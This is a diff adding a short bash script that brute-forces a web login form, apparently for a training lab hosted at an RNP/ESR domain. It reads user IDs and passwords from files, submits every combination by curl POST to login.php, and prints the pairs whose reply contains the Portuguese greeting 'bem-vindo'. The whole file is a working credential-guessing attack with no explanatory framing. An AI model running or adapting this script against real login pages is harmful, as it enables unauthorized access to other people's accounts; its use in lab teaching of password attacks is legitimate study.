@@ -1,0 +1,15 @@
+#!/bin/bash
+
+for pwd in $(cat pwds) 
+do
+   for id in $(cat ids) 
+   do
+      if [ $(curl -s --data "userid=$id&senha=$pwd&Submit1=Login" \
+           http://form-auth.esr.rnp.br/login.php | \
+           grep -c "bem-vindo") -ne 0 ];
+      then
+         echo "($id, $pwd)"
+      fi
+   done
+done
+
